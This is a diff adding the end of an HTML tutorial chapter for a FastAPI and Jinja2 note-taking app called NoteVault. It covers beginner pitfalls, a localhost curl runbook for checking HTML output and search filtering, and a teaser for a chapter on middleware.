+        <section id="gotchas" class="space-y-6">
+            <div class="border-b border-slate-200 pb-3">
+                <span class="text-rose-600 font-mono text-xs font-bold uppercase tracking-wider">Warning Track</span>
+                <h2 class="text-3xl font-bold text-slate-900 mt-1">Beginner Pitfalls &amp; Anti-Patterns</h2>
+            </div>
+
+            <div class="grid md:grid-cols-2 gap-6">
+                <!-- Anti-Pattern 1 -->
+                <div class="bg-rose-50 border-l-4 border-rose-500 p-6 rounded-r-2xl space-y-3">
+                    <div class="text-rose-900 font-bold flex items-center gap-2">
+                        <span>&#10060;</span>
+                        <span>Forgetting the Request Argument</span>
+                    </div>
+                    <p class="text-xs text-rose-800">
+                        Writing <code class="font-mono bg-rose-100 px-1 py-0.5 rounded text-rose-900">async def dashboard(): return templates.TemplateResponse(...)</code> without defining <code class="font-mono text-rose-900">request: Request</code>.
+                    </p>
+                    <p class="text-xs text-rose-900 leading-relaxed">
+                        <strong>Why this is bad:</strong> Starlette's template response mechanism requires the live ASGI <code class="font-mono">request</code> instance to build dynamic URLs, read session cookies, and handle CSRF tokens. Always declare <code class="font-mono bg-rose-100 px-1 rounded text-rose-900 font-bold">request: Request</code> in your controller parameter list.
+                    </p>
+                </div>
+
+                <!-- Anti-Pattern 2 -->
+                <div class="bg-rose-50 border-l-4 border-rose-500 p-6 rounded-r-2xl space-y-3">
+                    <div class="text-rose-900 font-bold flex items-center gap-2">
+                        <span>&#10060;</span>
+                        <span>Overriding Built-In Jinja Global Filters</span>
+                    </div>
+                    <p class="text-xs text-rose-800">
+                        Writing raw business calculations or complex database queries inside Jinja2 expressions like <code class="font-mono bg-rose-100 px-1 py-0.5 rounded text-rose-900">{{ db.query().filter() }}</code>.
+                    </p>
+                    <p class="text-xs text-rose-900 leading-relaxed">
+                        <strong>Why this is bad:</strong> Violates MVC separation. The View must remain a "dumb" presentation layer. All filtering, pagination, and calculations belong in the Controller and Service layers <em>before</em> passing data to the template.
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <!-- 7. Interactive Verification & Terminal Runbook -->
+        <section id="runbook" class="bg-slate-900 text-white p-8 rounded-3xl space-y-6">
+            <div class="border-b border-slate-800 pb-3">
+                <span class="text-emerald-400 font-mono text-xs font-bold uppercase tracking-wider">Runbook</span>
+                <h2 class="text-2xl font-bold mt-1">Validating NoteVault Milestone 03</h2>
+            </div>
+
+            <p class="text-slate-300 text-sm">
+                Ensure <code class="font-mono text-xs bg-slate-800 px-1.5 py-0.5 rounded text-emerald-400">jinja2</code> is installed in your virtual environment (<code class="font-mono text-xs text-slate-300">pip install jinja2</code>), boot the server, and verify both HTML and JSON outputs:
+            </p>
+
+            <div class="space-y-4 font-mono text-xs">
+                <!-- Check 1: HTML Output -->
+                <div>
+                    <span class="text-slate-500"># 1. Fetch the HTML Dashboard via curl (verify text/html header and rendered markup):</span>
+                    <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 text-emerald-400 mt-1 overflow-x-auto">
+                        curl -i http://127.0.0.1:8000/notes
+                    </div>
+                    <span class="text-slate-500 text-[11px] mt-1 block">Expected header: Content-Type: text/html; charset=utf-8</span>
+                </div>
+
+                <!-- Check 2: Filter query -->
+                <div>
+                    <span class="text-slate-500"># 2. Test server-side filtering via search query:</span>
+                    <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 text-slate-300 mt-1 overflow-x-auto">
+                        curl -i "http://127.0.0.1:8000/notes?search=template"
+                    </div>
+                </div>
+            </div>
+
+            <div class="p-4 bg-emerald-500/10 border border-emerald-500/30 rounded-2xl flex items-center justify-between text-xs">
+                <span>View your NoteVault Web Dashboard in your web browser:</span>
+                <a href="http://127.0.0.1:8000/notes" target="_blank" class="bg-emerald-500 text-slate-950 font-bold px-3 py-1.5 rounded-lg hover:bg-emerald-400 transition">Open /notes &rarr;</a>
+            </div>
+        </section>
+
+        <!-- Chapter Summary & Teaser for Chapter 4 -->
+        <section class="border-t border-slate-200 pt-8 flex flex-col sm:flex-row items-center justify-between gap-4">
+            <div>
+                <span class="text-xs font-mono font-bold text-slate-400 uppercase">Up Next</span>
+                <h4 class="text-lg font-bold text-slate-900">Chapter 04: Middleware &amp; The Request Pipeline</h4>
+                <p class="text-xs text-slate-500">Wrapping our application in cross-cutting concerns: CORS policies, request performance timing, and global exception interception.</p>
+            </div>
+            <a href="chapter4_middleware.html" class="inline-flex items-center gap-2 px-5 py-2.5 rounded-xl bg-slate-900 text-emerald-400 hover:bg-slate-800 font-mono text-xs font-bold transition shadow-md">
+                Continue to Chapter 4 &rarr;
+            </a>
+        </section>
+
+    </main>
+</body>
+</html>
